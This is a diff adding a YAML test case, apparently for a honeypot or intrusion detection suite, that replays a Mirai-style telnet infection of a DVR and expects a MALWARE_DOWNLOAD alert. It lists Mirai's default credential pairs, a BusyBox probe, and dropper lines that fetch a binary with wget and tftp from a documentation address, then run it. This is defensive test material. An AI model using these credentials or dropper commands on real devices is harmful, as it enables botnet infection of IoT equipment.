@@ -1,0 +1,30 @@
+id: dvr-telnet-mirai-dropper
+name: Mirai-style DVR telnet infection
+description: Mirai's credential table against the DVR's BusyBox telnet until admin/admin works, the ECCHI applet probe, a CPU check, then a wget/tftp dropper fetch
+  from a TEST-NET address. The shell never fetches anything.
+trial_kind: attack
+target_services:
+- iot-telnet
+expected_detection: MALWARE_DOWNLOAD
+severity: critical
+models: T1110.001 -> T1059.004 -> T1105
+steps:
+- service: iot-telnet
+  credentials:
+  - - root
+    - xc3511
+  - - root
+    - vizxv
+  - - root
+    - '888888'
+  - - admin
+    - admin
+  commands:
+  - enable
+  - system
+  - shell
+  - sh
+  - /bin/busybox ECCHI
+  - cat /proc/cpuinfo
+  - cd /tmp; wget http://198.51.100.23/bins/mirai.arm7 -O .d; chmod 777 .d; ./.d telnet.dvr
+  - /bin/busybox tftp -g -r mips 198.51.100.23
